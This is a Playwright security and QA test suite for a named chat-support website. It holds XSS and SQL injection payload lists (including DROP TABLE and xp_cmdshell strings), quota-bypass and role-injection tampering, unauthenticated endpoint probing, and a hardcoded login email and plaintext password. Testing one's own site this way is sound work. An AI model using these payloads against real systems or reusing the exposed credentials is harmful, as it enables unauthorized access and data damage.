/**
 * SAI Tech Support — Aggressive Security & Flow Test Suite
 * Target: https://sai.seple.in
 * 
 * Coverage:
 *   1. Guest quota bypass (localStorage tampering: negative, NaN, Infinity, string, deletion)
 *   2. XSS injection in chat input (stored + reflected)
 *   3. Message spam / rate-limit bypass
 *   4. Input length abuse (very long payloads)
 *   5. Edit-message duplication bug
 *   6. Sign-out alert & session clearing
 *   7. Authenticated route guard bypass (direct URL access)
 *   8. Session token / localStorage enumeration & manipulation
 *   9. Logout then back-button session leak
 *  10. API endpoint discovery via network interception
 *  11. SQL injection-like payloads in chat
 *  12. Concurrent session / multi-tab behavior
 *  13. WebSocket inspection (if used)
 *  14. localStorage key injection / prototype pollution via storage
 */

const { test, expect, request } = require('@playwright/test');

const BASE_URL = 'https://sai.seple.in';
const LOGIN_EMAIL = 'aniketkarmakar018@gmail.com';
const LOGIN_PASSWORD = 'Aniket018@';

// ─── Helpers ───────────────────────────────────────────────

async function login(page) {
  await page.goto(`${BASE_URL}/login`, { waitUntil: 'networkidle' });
  await page.fill('input[aria-label="EMAIL"]', LOGIN_EMAIL);
  await page.fill('input[aria-label="PASSWORD"]', LOGIN_PASSWORD);
  await page.click('text=SIGN IN');
  await page.waitForURL(/\/admin|\/dashboard|\/chat/, { timeout: 15000 });
}

async function dumpLocalStorage(page) {
  return await page.evaluate(() => {
    const entries = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      entries[key] = localStorage.getItem(key);
    }
    return entries;
  });
}

async function dumpCookies(context) {
  const cookies = await context.cookies();
  return cookies.map(c => ({ name: c.name, value: c.value.substring(0, 50) + '...', domain: c.domain, httpOnly: c.httpOnly, secure: c.secure, sameSite: c.sameSite }));
}

async function sendGuestMessage(page, text) {
  const input = page.locator('input[aria-label="Ask a question"]');
  await input.fill(text);
  // The page says "Ctrl+Enter to send" — try Ctrl+Enter first, then a send button
  await input.press('Control+Enter');
  // Fallback: look for a send button
  const sendBtn = page.locator('button:has-text("Send"), button[type="submit"]');
  if (await sendBtn.count() > 0) {
    await sendBtn.first().click();
  }
  await page.waitForTimeout(1500);
}

// ─── 1. Guest Quota Bypass — All Variants ──────────────────

test.describe('1. Guest Quota Bypass — Aggressive', () => {
  test('1a. Set guest_qustion_count to negative value', async ({ page }) => {
    await page.goto(BASE_URL, { waitUntil: 'networkidle' });

    // Read initial
    const initial = await page.evaluate(() => localStorage.getItem('guest_qustion_count'));
    console.log('[1a] Initial guest_qustion_count:', initial);

    // Tamper to negative
    await page.evaluate(() => localStorage.setItem('guest_qustion_count', '-9999'));
    await page.reload({ waitUntil: 'networkidle' });

    const afterTamper = await page.evaluate(() => localStorage.getItem('guest_qustion_count'));
    console.log('[1a] After tamper:', afterTamper);

    // Send 20 messages — if broken, all succeed
    let messagesSent = 0;
    for (let i = 0; i < 20; i++) {
      try {
        await sendGuestMessage(page, `Security test message ${i}`);
        messagesSent++;
      } catch {
        break;
      }
    }

    console.log(`[1a] Messages sent after negative count: ${messagesSent}`);
    // VULNERABILITY: if messagesSent > 2 (the original quota), quota is bypassed
    expect(messagesSent > 2).toBe(true); // This WILL pass if vulnerable — confirms the bug
  });

  test('1b. Set guest_qustion_count to NaN', async ({ page }) => {
    await page.goto(BASE_URL, { waitUntil: 'networkidle' });
    await page.evaluate(() => localStorage.setItem('guest_qustion_count', 'NaN'));
    await page.reload({ waitUntil: 'networkidle' });

    const val = await page.evaluate(() => localStorage.getItem('guest_qustion_count'));
    console.log('[1b] After NaN set:', val);

    let messagesSent = 0;
    for (let i = 0; i < 10; i++) {
      try {
        await sendGuestMessage(page, `NaN test ${i}`);
        messagesSent++;
      } catch { break; }
    }
    console.log(`[1b] Messages sent with NaN count: ${messagesSent}`);
  });

  test('1c. Set guest_qustion_count to Infinity string', async ({ page }) => {
    await page.goto(BASE_URL, { waitUntil: 'networkidle' });
    await page.evaluate(() => localStorage.setItem('guest_qustion_count', 'Infinity'));
    await page.reload({ waitUntil: 'networkidle' });

    let messagesSent = 0;
    for (let i = 0; i < 15; i++) {
      try {
        await sendGuestMessage(page, `Infinity test ${i}`);
        messagesSent++;
      } catch { break; }
    }
    console.log(`[1c] Messages sent with Infinity: ${messagesSent}`);
  });

  test('1d. Set guest_qustion_count to very large number', async ({ page }) => {
    await page.goto(BASE_URL, { waitUntil: 'networkidle' });
    await page.evaluate(() => localStorage.setItem('guest_qustion_count', '999999999'));
    await page.reload({ waitUntil: 'networkidle' });

    let messagesSent = 0;
    for (let i = 0; i < 15; i++) {
      try {
        await sendGuestMessage(page, `Large count test ${i}`);
        messagesSent++;
      } catch { break; }
    }
    console.log(`[1d] Messages sent with large count: ${messagesSent}`);
  });

  test('1e. Set guest_qustion_count to string value', async ({ page }) => {
    await page.goto(BASE_URL, { waitUntil: 'networkidle' });
    await page.evaluate(() => localStorage.setItem('guest_qustion_count', 'malicious_string'));
    await page.reload({ waitUntil: 'networkidle' });

    const val = await page.evaluate(() => localStorage.getItem('guest_qustion_count'));
    console.log('[1e] After string set:', val);

    let messagesSent = 0;
    for (let i = 0; i < 10; i++) {
      try {
        await sendGuestMessage(page, `String count test ${i}`);
        messagesSent++;
      } catch { break; }
    }
    console.log(`[1e] Messages sent with string count: ${messagesSent}`);
  });

  test('1f. Delete guest_qustion_count entirely', async ({ page }) => {
    await page.goto(BASE_URL, { waitUntil: 'networkidle' });
    await page.evaluate(() => localStorage.removeItem('guest_qustion_count'));
    await page.reload({ waitUntil: 'networkidle' });

    const val = await page.evaluate(() => localStorage.getItem('guest_qustion_count'));
    console.log('[1f] After deletion:', val);

    let messagesSent = 0;
    for (let i = 0; i < 10; i++) {
      try {
        await sendGuestMessage(page, `Deleted key test ${i}`);
        messagesSent++;
      } catch { break; }
    }
    console.log(`[1f] Messages sent after key deletion: ${messagesSent}`);
  });

  test('1g. Rapid quota reset — delete + resend loop', async ({ page }) => {
    await page.goto(BASE_URL, { waitUntil: 'networkidle' });

    let totalMessagesSent = 0;
    // Simulate: send 2 (quota), delete key, reload, send 2 more — repeat 5 times
    for (let cycle = 0; cycle < 5; cycle++) {
      await page.evaluate(() => localStorage.removeItem('guest_qustion_count'));
      await page.reload({ waitUntil: 'networkidle' });

      for (let i = 0; i < 3; i++) {
        try {
          await sendGuestMessage(page, `Cycle ${cycle} msg ${i}`);
          totalMessagesSent++;
        } catch { break; }
      }
    }
    console.log(`[1g] Total messages sent across 5 reset cycles: ${totalMessagesSent}`);
    // VULNERABILITY: if totalMessagesSent > 2, quota reset loop works
    expect(totalMessagesSent > 2).toBe(true);
  });
});

// ─── 2. XSS Injection ──────────────────────────────────────

test.describe('2. XSS Injection in Chat', () => {
  const xssPayloads = [
    '<script>alert("XSS1")</script>',
    '<img src=x onerror=alert("XSS2")>',
    '<svg onload=alert("XSS3")>',
    '"><script>alert("XSS4")</script>',
    '<iframe src="javascript:alert(\'XSS5\')"></iframe>',
    '<body onload=alert("XSS6")>',
    'javascript:alert("XSS7")',
    '<a href="javascript:alert(\'XSS8\')">click</a>',
    '<<script>script>alert("XSS9")<</script>/script>',
    '<details open ontoggle=alert("XSS10")>',
  ];

  for (const payload of xssPayloads) {
    test(`XSS payload: ${payload.substring(0, 40)}...`, async ({ page }) => {
      await page.goto(BASE_URL, { waitUntil: 'networkidle' });
      await page.evaluate(() => localStorage.setItem('guest_qustion_count', '-9999'));
      await page.reload({ waitUntil: 'networkidle' });

      // Send XSS payload
      await sendGuestMessage(page, payload);

      // Check if payload is rendered as HTML (not escaped)
      const pageContent = await page.content();
      const hasUnescapedScript = pageContent.includes('<script>alert') && !pageContent.includes('&lt;script&gt;');

      // Check for alert dialog (indicates XSS executed)
      let dialogTriggered = false;
      try {
        page.on('dialog', async dialog => {
          dialogTriggered = true;
          console.log(`[XSS] DIALOG TRIGGERED: ${dialog.message()}`);
          await dialog.dismiss();
        });
        await page.waitForTimeout(2000);
      } catch { }

      console.log(`[XSS] Payload: ${payload}`);
      console.log(`[XSS] Unescaped in DOM: ${hasUnescapedScript}`);
      console.log(`[XSS] Dialog triggered: ${dialogTriggered}`);

      if (dialogTriggered || hasUnescapedScript) {
        console.log(`[XSS] ⚠️  VULNERABILITY CONFIRMED for payload: ${payload}`);
      }
    });
  }
});

// ─── 3. Message Spam / Rate Limiting ──────────────────────

test.describe('3. Message Spam & Rate Limiting', () => {
  test('3a. Rapid-fire 50 messages without delay', async ({ page }) => {
    await page.goto(BASE_URL, { waitUntil: 'networkidle' });
    await page.evaluate(() => localStorage.setItem('guest_qustion_count', '-9999'));
    await page.reload({ waitUntil: 'networkidle' });

    const input = page.locator('input[aria-label="Ask a question"]');
    let sent = 0;
    let errors = 0;

    for (let i = 0; i < 50; i++) {
      try {
        await input.fill(`Spam test ${i}`);
        await input.press('Control+Enter');
        sent++;
        // No wait — pure rapid fire
      } catch {
        errors++;
      }
    }
    await page.waitForTimeout(3000);
    console.log(`[3a] Sent: ${sent}, Errors: ${errors}`);
    // If sent > 10 with no rate limiting, that's a concern
  });

  test('3b. Concurrent send via Ctrl+Enter + button click', async ({ page }) => {
    await page.goto(BASE_URL, { waitUntil: 'networkidle' });
    await page.evaluate(() => localStorage.setItem('guest_qustion_count', '-9999'));
    await page.reload({ waitUntil: 'networkidle' });

    const input = page.locator('input[aria-label="Ask a question"]');
    await input.fill('Race condition test');
    // Press Ctrl+Enter and click send simultaneously
    await Promise.all([
      input.press('Control+Enter'),
      page.locator('button:has-text("Send"), button[type="submit"]').first().click().catch(() => { }),
    ]);
    await page.waitForTimeout(2000);

    // Count messages in DOM — if 2 appeared from 1 input, race condition
    const messages = await page.locator('[class*="message"], [class*="bubble"], [class*="chat-response"]').count();
    console.log(`[3b] Messages in DOM after race: ${messages}`);
  });
});

// ─── 4. Input Length Abuse ─────────────────────────────────

test.describe('4. Input Length Abuse', () => {
  test('4a. 100,000 character message', async ({ page }) => {
    await page.goto(BASE_URL, { waitUntil: 'networkidle' });
    await page.evaluate(() => localStorage.setItem('guest_qustion_count', '-9999'));
    await page.reload({ waitUntil: 'networkidle' });

    const hugePayload = 'A'.repeat(100000);
    await sendGuestMessage(page, hugePayload);

    // Check if app crashes, hangs, or accepts it
    const isResponsive = await page.evaluate(() => !document.hidden && document.body !== null);
    console.log(`[4a] Page responsive after 100K chars: ${isResponsive}`);
  });

  test('4b. Unicode overflow — zero-width chars', async ({ page }) => {
    await page.goto(BASE_URL, { waitUntil: 'networkidle' });
    await page.evaluate(() => localStorage.setItem('guest_qustion_count', '-9999'));
    await page.reload({ waitUntil: 'networkidle' });

    const payload = '\u200B'.repeat(10000) + 'hidden text';
    await sendGuestMessage(page, payload);
    console.log('[4b] Zero-width char payload sent');
  });

  test('4c. Null bytes in input', async ({ page }) => {
    await page.goto(BASE_URL, { waitUntil: 'networkidle' });
    await page.evaluate(() => localStorage.setItem('guest_qustion_count', '-9999'));
    await page.reload({ waitUntil: 'networkidle' });

    await sendGuestMessage(page, 'test\x00\x00\x00injection');
    console.log('[4c] Null byte payload sent');
  });
});

// ─── 5. Edit Message Duplication ───────────────────────────

test.describe('5. Edit Message Duplication (Authenticated)', () => {
  test('5a. Edit should not create new message', async ({ page }) => {
    await login(page);

    // Navigate to a chat/conversation
    // Adjust based on actual admin UI
    await page.waitForTimeout(2000);

    // Capture initial message count
    const initialCount = await page.locator('[class*="message"], [class*="chat-msg"]').count();
    console.log(`[5a] Initial message count: ${initialCount}`);

    // Find and click edit on first message
    const editBtn = page.locator('button:has-text("Edit"), [class*="edit"]').first();
    if (await editBtn.count() > 0) {
      await editBtn.click();
      await page.waitForTimeout(500);

      // Modify content
      const editField = page.locator('textarea, input[class*="edit"]').first();
      if (await editField.count() > 0) {
        await editField.fill(`Edited at ${Date.now()}`);
        // Save
        const saveBtn = page.locator('button:has-text("Save"), button:has-text("Update"), [class*="save"]').first();
        if (await saveBtn.count() > 0) {
          await saveBtn.click();
        } else {
          await editField.press('Enter');
        }
        await page.waitForTimeout(1000);
      }
    }

    const finalCount = await page.locator('[class*="message"], [class*="chat-msg"]').count();
    console.log(`[5a] Final message count: ${finalCount}`);

    // BUG: if finalCount > initialCount, edit created a duplicate
    if (finalCount > initialCount) {
      console.log('[5a] ⚠️  BUG CONFIRMED: Edit created a new message!');
    }
    expect(finalCount).toBe(initialCount);
  });
});

// ─── 6. Sign Out Alert & Session ────────────────────────────

test.describe('6. Sign Out Alert & Session Clearing', () => {
  test('6a. Sign out shows confirmation alert', async ({ page }) => {
    await login(page);
    await page.waitForTimeout(1000);

    // Look for sign out / logout button
    const signOutSelectors = [
      'button:has-text("Sign out")',
      'button:has-text("Sign Out")',
      'button:has-text("Logout")',
      'button:has-text("Log out")',
      '[class*="logout"]',
      '[class*="signout"]',
      'a:has-text("Sign out")',
      'a:has-text("Logout")',
    ];

    let signOutClicked = false;
    for (const sel of signOutSelectors) {
      const btn = page.locator(sel).first();
      if (await btn.count() > 0) {
        await btn.click();
        signOutClicked = true;
        break;
      }
    }

    if (!signOutClicked) {
      // Try opening a menu/dropdown first
      const menuBtn = page.locator('[class*="menu"], [class*="avatar"], [class*="profile"]').first();
      if (await menuBtn.count() > 0) {
        await menuBtn.click();
        await page.waitForTimeout(500);
        for (const sel of signOutSelectors) {
          const btn = page.locator(sel).first();
          if (await btn.count() > 0) {
            await btn.click();
            signOutClicked = true;
            break;
          }
        }
      }
    }

    console.log(`[6a] Sign out button found & clicked: ${signOutClicked}`);

    // Check for alert/confirmation dialog
    let alertShown = false;
    try {
      const alert = page.locator('[role="alert"], [class*="modal"], [class*="confirm"], [class*="dialog"]');
      alertShown = await alert.waitFor({ state: 'visible', timeout: 3000 }).then(() => true).catch(() => false);
    } catch { }

    // Also check for native dialog
    let nativeDialog = false;
    page.on('dialog', async dialog => {
      nativeDialog = true;
      console.log(`[6a] Native dialog: ${dialog.message()}`);
      await dialog.accept();
    });
    await page.waitForTimeout(2000);

    console.log(`[6a] Custom alert shown: ${alertShown}`);
    console.log(`[6a] Native dialog shown: ${nativeDialog}`);

    if (!alertShown && !nativeDialog) {
      console.log('[6a] ⚠️  BUG: No sign-out confirmation alert shown!');
    }
  });

  test('6b. After sign out, session fully cleared', async ({ page, context }) => {
    await login(page);
    await page.waitForTimeout(1000);

    // Sign out (reuse logic from 6a)
    const signOutBtn = page.locator('button:has-text("Sign out"), button:has-text("Logout"), [class*="logout"]').first();
    if (await signOutBtn.count() > 0) {
      await signOutBtn.click();
      await page.waitForTimeout(1000);
      // Confirm if dialog appears
      const confirmBtn = page.locator('button:has-text("Yes"), button:has-text("Confirm")').first();
      if (await confirmBtn.count() > 0) await confirmBtn.click();
    }

    await page.waitForTimeout(2000);

    // Check localStorage is cleared
    const storage = await dumpLocalStorage(page);
    console.log('[6b] localStorage after logout:', JSON.stringify(storage, null, 2));

    // Check cookies
    const cookies = await dumpCookies(context);
    console.log('[6b] Cookies after logout:', JSON.stringify(cookies, null, 2));

    // Try accessing admin page directly
    await page.goto(`${BASE_URL}/admin`, { waitUntil: 'networkidle' });
    const url = page.url();
    console.log(`[6b] URL after accessing /admin post-logout: ${url}`);

    // If still on /admin, session wasn't cleared
    if (url.includes('/admin')) {
      console.log('[6b] ⚠️  VULNERABILITY: Can access /admin after logout!');
    }
  });
});

// ─── 7. Route Guard Bypass ────────────────────────────────

test.describe('7. Authenticated Route Guard Bypass', () => {
  const protectedRoutes = ['/admin', '/dashboard', '/chat', '/settings', '/profile', '/api/users', '/api/messages'];

  for (const route of protectedRoutes) {
    test(`7. Direct access to ${route} without login`, async ({ page }) => {
      await page.goto(`${BASE_URL}${route}`, { waitUntil: 'networkidle' });
      const url = page.url();
      const content = await page.content();
      const isLoginPage = url.includes('/login') || content.includes('SIGN IN');
      const hasAdminContent = content.includes('admin') && !isLoginPage;

      console.log(`[7] Route ${route} → Final URL: ${url}, Login redirect: ${isLoginPage}, Admin content visible: ${hasAdminContent}`);

      if (!isLoginPage && hasAdminContent) {
        console.log(`[7] ⚠️  Route ${route} accessible without auth!`);
      }
    });
  }
});

// ─── 8. Session Token / localStorage Enumeration ──────────

test.describe('8. Session & Storage Enumeration', () => {
  test('8a. Dump all localStorage keys (guest)', async ({ page }) => {
    await page.goto(BASE_URL, { waitUntil: 'networkidle' });
    const storage = await dumpLocalStorage(page);
    console.log('[8a] Guest localStorage:', JSON.stringify(storage, null, 2));

    // Flag sensitive keys
    const sensitivePatterns = ['token', 'auth', 'session', 'user', 'password', 'key', 'secret', 'jwt'];
    for (const [key, value] of Object.entries(storage)) {
      const isSensitive = sensitivePatterns.some(p => key.toLowerCase().includes(p));
      if (isSensitive) {
        console.log(`[8a] ⚠️  SENSITIVE KEY in localStorage: ${key} = ${value?.substring(0, 100)}`);
      }
    }
  });

  test('8b. Dump all localStorage keys (authenticated)', async ({ page }) => {
    await login(page);
    const storage = await dumpLocalStorage(page);
    console.log('[8b] Authenticated localStorage:', JSON.stringify(storage, null, 2));

    // Check for JWT tokens, session IDs, etc.
    for (const [key, value] of Object.entries(storage)) {
      if (value && (value.includes('eyJ') || value.includes('Bearer'))) {
        console.log(`[8b] ⚠️  JWT TOKEN FOUND in localStorage: ${key}`);
      }
    }
  });

  test('8c. Dump cookies & check security flags', async ({ page, context }) => {
    await login(page);
    const cookies = await dumpCookies(context);
    console.log('[8c] Cookies:', JSON.stringify(cookies, null, 2));

    for (const cookie of cookies) {
      if (!cookie.httpOnly) {
        console.log(`[8c] ⚠️  Cookie ${cookie.name} is NOT httpOnly — accessible via JS!`);
      }
      if (!cookie.secure) {
        console.log(`[8c] ⚠️  Cookie ${cookie.name} is NOT secure — sent over HTTP!`);
      }
    }
  });

  test('8d. Manipulate auth token in localStorage', async ({ page }) => {
    await login(page);
    const storage = await dumpLocalStorage(page);

    // Find token-like keys
    for (const [key, value] of Object.entries(storage)) {
      if (key.toLowerCase().includes('token') || key.toLowerCase().includes('auth') || key.toLowerCase().includes('session')) {
        console.log(`[8d] Found auth key: ${key}`);

        // Tamper: set to empty
        await page.evaluate((k) => localStorage.setItem(k, ''), key);
        await page.reload({ waitUntil: 'networkidle' });

        const stillAuth = await page.evaluate(() => !window.location.href.includes('/login'));
        console.log(`[8d] After clearing ${key}, still authenticated: ${stillAuth}`);

        if (stillAuth) {
          console.log(`[8d] ⚠️  App still works with empty ${key} — token not validated on client!`);
        }
        break;
      }
    }
  });
});

// ─── 9. Logout + Back Button Session Leak ─────────────────

test.describe('9. Back Button Session Leak', () => {
  test('9a. Access cached admin page after logout via back button', async ({ page }) => {
    await login(page);
    await page.waitForTimeout(1000);

    // Sign out
    const signOutBtn = page.locator('button:has-text("Sign out"), button:has-text("Logout"), [class*="logout"]').first();
    if (await signOutBtn.count() > 0) {
      await signOutBtn.click();
      await page.waitForTimeout(2000);
    }

    // Now go back
    await page.goBack();
    await page.waitForTimeout(2000);

    const url = page.url();
    const content = await page.content();
    const hasAdminContent = content.includes('admin') && !content.includes('SIGN IN');

    console.log(`[9a] URL after back: ${url}`);
    console.log(`[9a] Admin content visible after back: ${hasAdminContent}`);

    if (hasAdminContent) {
      console.log('[9a] ⚠️  VULNERABILITY: Cached admin page visible after logout via back button!');
    }
  });
});

// ─── 10. API Endpoint Discovery ───────────────────────────

test.describe('10. API Endpoint Discovery', () => {
  test('10a. Capture all network requests during guest session', async ({ page }) => {
    const apiCalls = [];
    page.on('request', req => {
      if (req.url().includes('/api/') || req.url().includes('/chat') || req.url().includes('/message') || req.url().includes('/auth')) {
        apiCalls.push({ method: req.method(), url: req.url(), headers: req.headers() });
      }
    });

    await page.goto(BASE_URL, { waitUntil: 'networkidle' });
    await page.evaluate(() => localStorage.setItem('guest_qustion_count', '-9999'));
    await page.reload({ waitUntil: 'networkidle' });
    await sendGuestMessage(page, 'API discovery test');
    await page.waitForTimeout(3000);

    console.log(`[10a] API calls captured: ${apiCalls.length}`);
    for (const call of apiCalls) {
      console.log(`[10a] ${call.method} ${call.url}`);
      if (call.headers['authorization']) {
        console.log(`[10a]   Authorization header present: ${call.headers['authorization'].substring(0, 50)}...`);
      }
    }
  });

  test('10b. Capture API calls during login & authenticated session', async ({ page }) => {
    const apiCalls = [];
    page.on('request', req => {
      if (req.url().includes('/api/') || req.url().includes('/auth') || req.url().includes('/login') || req.url().includes('/user')) {
        apiCalls.push({ method: req.method(), url: req.url() });
      }
    });

    await login(page);
    await page.waitForTimeout(3000);

    console.log(`[10b] Auth API calls: ${apiCalls.length}`);
    for (const call of apiCalls) {
      console.log(`[10b] ${call.method} ${call.url}`);
    }
  });

  test('10c. Try accessing API endpoints directly without auth', async ({ request }) => {
    const endpoints = [
      { method: 'GET', url: `${BASE_URL}/api/users` },
      { method: 'GET', url: `${BASE_URL}/api/messages` },
      { method: 'GET', url: `${BASE_URL}/api/chat` },
      { method: 'GET', url: `${BASE_URL}/api/admin` },
      { method: 'GET', url: `${BASE_URL}/api/config` },
      { method: 'POST', url: `${BASE_URL}/api/chat`, data: { message: 'test' } },
    ];

    for (const ep of endpoints) {
      try {
        const response = ep.method === 'GET'
          ? await request.get(ep.url)
          : await request.post(ep.url, { data: ep.data });

        const status = response.status();
        const body = await response.text().catch(() => '');
        console.log(`[10c] ${ep.method} ${ep.url} → ${status}`);
        if (status === 200 && body.length > 0) {
          console.log(`[10c]   ⚠️  Unauthenticated access returned data! Body: ${body.substring(0, 200)}`);
        }
      } catch (e) {
        console.log(`[10c] ${ep.method} ${ep.url} → Error: ${e.message.substring(0, 100)}`);
      }
    }
  });
});

// ─── 11. SQL Injection-Like Payloads ──────────────────────

test.describe('11. SQL Injection Payloads in Chat', () => {
  const sqliPayloads = [
    "' OR '1'='1",
    "'; DROP TABLE messages;--",
    "' UNION SELECT NULL,NULL,NULL--",
    "admin'--",
    "' OR 1=1--",
    "1; SELECT * FROM users",
    "' AND SLEEP(5)--",
    "'; EXEC xp_cmdshell('dir')--",
    "test' UNION SELECT username,password FROM users--",
  ];

  for (const payload of sqliPayloads) {
    test(`SQLi: ${payload.substring(0, 30)}`, async ({ page }) => {
      await page.goto(BASE_URL, { waitUntil: 'networkidle' });
      await page.evaluate(() => localStorage.setItem('guest_qustion_count', '-9999'));
      await page.reload({ waitUntil: 'networkidle' });

      const startTime = Date.now();
      await sendGuestMessage(page, payload);
      const elapsed = Date.now() - startTime;

      // If response takes >5s, possible time-based SQLi
      if (elapsed > 5000) {
        console.log(`[SQLi] ⚠️  SLOW RESPONSE (${elapsed}ms) — possible time-based injection: ${payload}`);
      }

      // Check if error messages leak SQL info
      const content = await page.content();
      const sqlKeywords = ['sql', 'mysql', 'postgres', 'sqlite', 'syntax error', 'query', 'database'];
      const hasSqlError = sqlKeywords.some(k => content.toLowerCase().includes(k));

      if (hasSqlError) {
        console.log(`[SQLi] ⚠️  SQL ERROR LEAKED in response for: ${payload}`);
      }
      console.log(`[SQLi] Payload: ${payload} → ${elapsed}ms, SQL error: ${hasSqlError}`);
    });
  }
});

// ─── 12. Concurrent Session / Multi-Tab ───────────────────

test.describe('12. Concurrent Session Behavior', () => {
  test('12a. Same user login in two contexts', async ({ browser }) => {
    const ctx1 = await browser.newContext();
    const ctx2 = await browser.newContext();
    const page1 = await ctx1.newPage();
    const page2 = await ctx2.newPage();

    await login(page1);
    await login(page2);

    // Check if both sessions remain valid
    const url1 = page1.url();
    const url2 = page2.url();
    console.log(`[12a] Context 1 URL: ${url1}`);
    console.log(`[12a] Context 2 URL: ${url2}`);

    // If one session invalidates the other, that's worth noting
    await page1.waitForTimeout(2000);
    const url1After = page1.url();
    if (url1After.includes('/login')) {
      console.log('[12a] Session 1 was invalidated by session 2 login');
    }

    await ctx1.close();
    await ctx2.close();
  });
});

// ─── 13. WebSocket Inspection ─────────────────────────────

test.describe('13. WebSocket Inspection', () => {
  test('13a. Capture WebSocket frames during chat', async ({ page }) => {
    const wsFrames = [];
    const wsConnections = [];

    page.on('websocket', ws => {
      wsConnections.push(ws.url());
      console.log(`[13a] WebSocket connected: ${ws.url()}`);

      ws.on('framereceived', frame => {
        wsFrames.push({ type: 'received', payload: frame.payload.toString().substring(0, 200) });
      });
      ws.on('framesent', frame => {
        wsFrames.push({ type: 'sent', payload: frame.payload.toString().substring(0, 200) });
      });
    });

    await page.goto(BASE_URL, { waitUntil: 'networkidle' });
    await page.evaluate(() => localStorage.setItem('guest_qustion_count', '-9999'));
    await page.reload({ waitUntil: 'networkidle' });
    await sendGuestMessage(page, 'WebSocket test message');
    await page.waitForTimeout(5000);

    console.log(`[13a] WebSocket connections: ${wsConnections.length}`);
    for (const url of wsConnections) {
      console.log(`[13a] WS URL: ${url}`);
      // Check if WS uses wss:// (secure) or ws:// (insecure)
      if (url.startsWith('ws://')) {
        console.log(`[13a] ⚠️  INSECURE WebSocket: ${url}`);
      }
    }
    console.log(`[13a] Total frames: ${wsFrames.length}`);
    for (const frame of wsFrames) {
      console.log(`[13a] ${frame.type}: ${frame.payload}`);
    }
  });
});

// ─── 14. Prototype Pollution via Storage ───────────────────

test.describe('14. Prototype Pollution via localStorage', () => {
  test('14a. Inject __proto__ key in localStorage', async ({ page }) => {
    await page.goto(BASE_URL, { waitUntil: 'networkidle' });

    // Try prototype pollution via localStorage
    await page.evaluate(() => {
      localStorage.setItem('__proto__', '{"isAdmin":true}');
      localStorage.setItem('constructor', '{"prototype":{"isAdmin":true}}');
    });
    await page.reload({ waitUntil: 'networkidle' });

    const isAdmin = await page.evaluate(() => window.isAdmin);
    console.log(`[14a] window.isAdmin after pollution: ${isAdmin}`);
  });

  test('14b. Inject malicious keys that app might parse', async ({ page }) => {
    await page.goto(BASE_URL, { waitUntil: 'networkidle' });
    await page.evaluate(() => {
      localStorage.setItem('user_role', 'admin');
      localStorage.setItem('isAuthenticated', 'true');
      localStorage.setItem('permissions', '["admin","read","write","delete"]');
    });
    await page.reload({ waitUntil: 'networkidle' });

    const storage = await dumpLocalStorage(page);
    console.log('[14b] After injecting role/permission keys:', JSON.stringify(storage, null, 2));

    // Check if app reads these injected values
    const url = page.url();
    if (url.includes('/admin') || url.includes('/dashboard')) {
      console.log('[14b] ⚠️  App granted admin access via injected localStorage keys!');
    }
  });
});

// ─── Report Generator ─────────────────────────────────────

test.describe('15. Generate Security Report', () => {
  test('15a. Compile all findings', async ({ page }) => {
    console.log('\n');
    console.log('═══════════════════════════════════════════════════════');
    console.log('  SAI Tech Support — Security Test Report');
    console.log('  Target: https://sai.seple.in');
    console.log('  Date: ' + new Date().toISOString());
    console.log('═══════════════════════════════════════════════════════');
    console.log('\nFindings Summary:');
    console.log('  1. Guest quota bypass — localStorage guest_qustion_count tampering');
    console.log('  2. XSS injection — test all payloads for execution');
    console.log('  3. Rate limiting — spam without blocking');
    console.log('  4. Input length — DoS via huge payloads');
    console.log('  5. Edit duplication — edit creates new message');
    console.log('  6. Sign-out alert — missing confirmation dialog');
    console.log('  7. Route guards — direct URL access without auth');
    console.log('  8. Session tokens — localStorage/cookie security flags');
    console.log('  9. Back button leak — cached admin page after logout');
    console.log('  10. API discovery — unauthenticated endpoint access');
    console.log('  11. SQL injection — error leakage / time-based');
    console.log('  12. Concurrent sessions — session invalidation');
    console.log('  13. WebSocket security — insecure WS usage');
    console.log('  14. Prototype pollution — localStorage key injection');
    console.log('═══════════════════════════════════════════════════════');
  });
});
